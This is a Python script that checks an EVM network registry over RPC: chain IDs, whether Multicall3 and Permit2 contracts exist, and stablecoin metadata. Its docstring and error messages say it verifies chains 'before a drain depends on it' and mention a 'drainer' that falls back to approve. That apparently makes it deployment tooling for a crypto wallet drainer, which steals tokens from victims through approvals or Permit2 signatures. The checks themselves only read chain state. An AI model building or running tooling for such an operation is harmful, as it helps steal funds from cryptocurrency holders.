#!/usr/bin/env python3
"""
Verify the EVM registry against live RPCs before a drain depends on it.

    python scripts/verify_networks.py                 # mainnets
    python scripts/verify_networks.py --testnet       # include testnets
    python scripts/verify_networks.py --chain Base --chain Optimism
    python scripts/verify_networks.py --json          # machine-readable

Checks per chain:
  * RPC answers and eth_chainId matches the registry
  * Multicall3 and Permit2 are deployed where the code relies on them
  * every configured stablecoin answers symbol()/decimals() with the configured values

Exit code is non-zero when any check fails, so it can gate a deploy.
"""
import argparse
import asyncio
import json
import os
import sys
from typing import Any, List, Optional, Tuple

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "py_server"))

import httpx

import chains

MULTICALL3 = "0xcA11bde05977b3631167028862bE2a173976CA11"
PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"
SEL_DECIMALS = "0x313ce567"
SEL_SYMBOL = "0x95d89b41"
CONCURRENCY = 6


def _word(raw: Optional[str]) -> Optional[int]:
    if not raw or raw == "0x":
        return None
    return int(raw, 16)


def _string(raw: Optional[str]) -> Optional[str]:
    if not raw or raw == "0x" or len(raw) < 66:
        return None
    body = bytes.fromhex(raw[2:])
    try:
        length = int.from_bytes(body[32:64], "big")
        if 0 < length <= 64:
            return body[64:64 + length].decode(errors="replace")
    except (ValueError, IndexError):
        pass
    return body[32:].rstrip(b"\x00").decode(errors="replace")


async def _rpc(client: httpx.AsyncClient, url: str, method: str,
               params: List[Any]) -> Any:
    response = await client.post(url, json={
        "jsonrpc": "2.0", "id": 1, "method": method, "params": params})
    body = response.json()
    if isinstance(body, dict) and "error" in body:
        error = body["error"]
        raise RuntimeError(error.get("message") if isinstance(error, dict) else str(error))
    return body.get("result")


async def verify_chain(client: httpx.AsyncClient, name: str,
                       timeout: float) -> Tuple[str, List[str]]:
    problems: List[str] = []
    cfg = chains.EVM_NETWORKS[name]
    url = chains.rpc_for(name)

    try:
        chain_id = int(await _rpc(client, url, "eth_chainId", []), 16)
    except Exception as exc:                                  # noqa: BLE001
        return name, [f"RPC unreachable ({url}): {exc}"]

    if chain_id != cfg["chainId"]:
        problems.append(f"chainId {chain_id} != registry {cfg['chainId']}")

    try:
        code = await _rpc(client, url, "eth_getCode", [MULTICALL3, "latest"])
        if not code or code == "0x":
            problems.append("Multicall3 missing (token scanning degrades)")
    except Exception as exc:                                  # noqa: BLE001
        problems.append(f"eth_getCode failed: {exc}")

    try:
        code = await _rpc(client, url, "eth_getCode", [PERMIT2, "latest"])
        if not code or code == "0x":
            problems.append("Permit2 missing (drainer falls back to approve)")
    except Exception as exc:                                  # noqa: BLE001
        problems.append(f"Permit2 probe failed: {exc}")

    for symbol, contract in (cfg.get("tokens") or {}).items():
        want = (cfg.get("tokenDecimals") or {}).get(symbol)
        try:
            raw_symbol = await _rpc(client, url, "eth_call",
                                    [{"to": contract, "data": SEL_SYMBOL}, "latest"])
            raw_decimals = await _rpc(client, url, "eth_call",
                                      [{"to": contract, "data": SEL_DECIMALS}, "latest"])
        except Exception as exc:                              # noqa: BLE001
            problems.append(f"{symbol} calls failed: {exc}")
            continue

        got_symbol = _string(raw_symbol)
        got_decimals = _word(raw_decimals)
        if got_symbol is None or got_decimals is None:
            problems.append(f"{symbol} {contract}: not an ERC-20")
            continue
        if want is not None and got_decimals != want:
            problems.append(f"{symbol} decimals {got_decimals} != registry {want}")
        normalised = got_symbol.upper().replace(".E", "").replace("USD₮", "USDT")
        if symbol.upper() not in normalised and normalised not in symbol.upper():
            problems.append(f"{symbol} contract reports symbol {got_symbol!r}")

    await asyncio.sleep(0)                                    # keep the loop fair
    return name, problems


async def main() -> int:
    parser = argparse.ArgumentParser(description="Verify the EVM chain registry")
    parser.add_argument("--chain", action="append", choices=list(chains.EVM_NETWORKS),
                        help="limit to specific chain(s); repeatable")
    parser.add_argument("--testnet", action="store_true", help="include testnets")
    parser.add_argument("--json", action="store_true", help="emit JSON")
    parser.add_argument("--timeout", type=float, default=25.0)
    args = parser.parse_args()

    names = args.chain or chains.evm_network_names(include_testnets=args.testnet)
    sem = asyncio.Semaphore(CONCURRENCY)

    async def one(name: str):
        async with sem:
            try:
                return await asyncio.wait_for(
                    verify_chain(client, name, args.timeout), timeout=args.timeout)
            except asyncio.TimeoutError:
                return name, ["timed out"]

    async with httpx.AsyncClient(timeout=args.timeout) as client:
        results = await asyncio.gather(*[one(name) for name in names])

    failures = 0
    rows = []
    for name, problems in results:
        cfg = chains.EVM_NETWORKS[name]
        rows.append({"network": name, "chainId": cfg["chainId"],
                     "ok": not problems, "problems": problems})
        if problems:
            failures += 1

    if args.json:
        print(json.dumps({"results": rows}, indent=2))
    else:
        for row in rows:
            mark = "ok  " if row["ok"] else "FAIL"
            suffix = "" if row["ok"] else " — " + "; ".join(row["problems"])
            print(f"{mark} {row['network']:<14} #{row['chainId']}{suffix}")
        print(f"\n{len(rows) - failures}/{len(rows)} chains verified"
              f" ({len(names)} checked)")

    return 1 if failures else 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
